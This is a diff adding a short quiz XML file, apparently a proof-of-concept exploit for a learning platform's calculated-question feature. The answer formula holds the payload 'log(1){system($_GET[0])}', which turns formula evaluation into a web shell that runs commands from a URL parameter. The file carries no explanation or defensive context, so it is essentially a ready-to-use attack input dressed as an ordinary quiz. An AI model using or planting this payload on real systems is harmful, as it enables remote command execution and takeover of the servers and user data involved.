@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<quiz>
+    <question type="calculated">
+        [...]
+        <answer fraction="100">
+            <text>log(1){system($_GET[0])}</text>
+        </answer>
+    </question>
+    <dataset_definitions>
+        <dataset_definition>
+            <name><text>x</text></name>
+        </dataset_definition>
+    </dataset_definitions>
+</quiz>
